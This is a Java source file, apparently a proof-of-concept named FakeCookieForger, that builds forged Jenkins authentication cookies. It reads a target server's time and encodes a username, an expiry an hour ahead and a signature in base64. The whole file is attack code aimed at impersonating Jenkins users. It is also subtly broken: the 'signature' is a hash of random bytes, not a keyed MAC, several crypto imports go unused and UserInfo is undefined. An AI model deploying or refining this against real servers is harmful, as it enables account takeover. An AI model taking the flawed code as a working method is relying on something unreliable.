package poc;

import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import javax.crypto.Mac;
import javax.crypto.spec.SecretKeySpec;
import javax.crypto.SecretKey;
import java.nio.charset.StandardCharsets;
import java.util.Base64;
import javax.crypto.Cipher;
import javax.crypto.CipherInputStream;
import javax.crypto.CipherOutputStream;
import java.io.InputStream;
import java.io.OutputStream;
import java.io.ByteArrayInputStream;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.Calendar;
import java.util.TimeZone;
import java.security.SecureRandom;



public final class FakeCookieForger {
    public String jenkins_server;

    public FakeCookieForger(String jenkins_server) {
        this.jenkins_server = jenkins_server;
    }

    private static long getServerTimeInMillis(String jenkinsUrl) {
        long serverDate = 0;
        try {
            URL url = new URL(jenkinsUrl);
            HttpURLConnection connection = (HttpURLConnection) url.openConnection();
            connection.setRequestMethod("GET");
            connection.connect();

            // Get the Date from response headers
            serverDate = connection.getDate();

            if (serverDate == 0) {
                // If the Date header is not found, return current GMT time in milliseconds
                serverDate = getCurrentTimeInMillisGMT();
            }

        } catch (Exception e) {
            // In case of any exception, return current GMT time in milliseconds
            e.printStackTrace();
            serverDate = getCurrentTimeInMillisGMT();
        }

        return serverDate;
    }

    private static long getCurrentTimeInMillisGMT() {
        // Get the current time in GMT
        Calendar calendar = Calendar.getInstance(TimeZone.getTimeZone("GMT"));
        return calendar.getTimeInMillis();
    }

    public String cookieFor(UserInfo userinfo) {
        try {
            long serverCurrentTime = getServerTimeInMillis(this.jenkins_server);
            long tokenExpiryTime = serverCurrentTime + 3600000; // 1 hour from now
            String tokenSignature = generateRandomSignature();
            String cookie = userinfo.name + ":" + Long.toString(tokenExpiryTime) + ":" + tokenSignature;
            String cookieBase64 = Base64.getEncoder().encodeToString(cookie.getBytes());
            return cookieBase64;
        } catch(Exception e){
            System.out.println("Exception: " + e.getMessage());
            e.printStackTrace();
        }
        return null;
    }

    public String generateRandomSignature() {
        try {
            // Generate random bytes
            SecureRandom random = new SecureRandom();
            byte[] randomBytes = new byte[32]; // 32 bytes for SHA-256
            random.nextBytes(randomBytes);

            // Compute SHA-256 hash
            MessageDigest digest = MessageDigest.getInstance("SHA-256");
            byte[] hashBytes = digest.digest(randomBytes);

            // Convert hash bytes to hexadecimal string
            String hexString = bytesToHex(hashBytes);
            
            return hexString;
        } catch (NoSuchAlgorithmException e) {
            e.printStackTrace();
        }

        return "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa";
    }

    private byte[] hexStringToByteArray(String hexString) {
        int len = hexString.length();
        byte[] data = new byte[len / 2];

        for (int i = 0; i < len; i += 2) {
            data[i / 2] = (byte) ((Character.digit(hexString.charAt(i), 16) << 4)
                                 + Character.digit(hexString.charAt(i+1), 16));
        }

        return data;
    }

    // Method to convert byte array to hex string
    private String bytesToHex(byte[] bytes) {
        StringBuilder hexString = new StringBuilder();
        for (byte b : bytes) {
            String hex = Integer.toHexString(0xff & b);
            if (hex.length() == 1) {
                hexString.append('0');
            }
            hexString.append(hex);
        }
        return hexString.toString();
    }
}
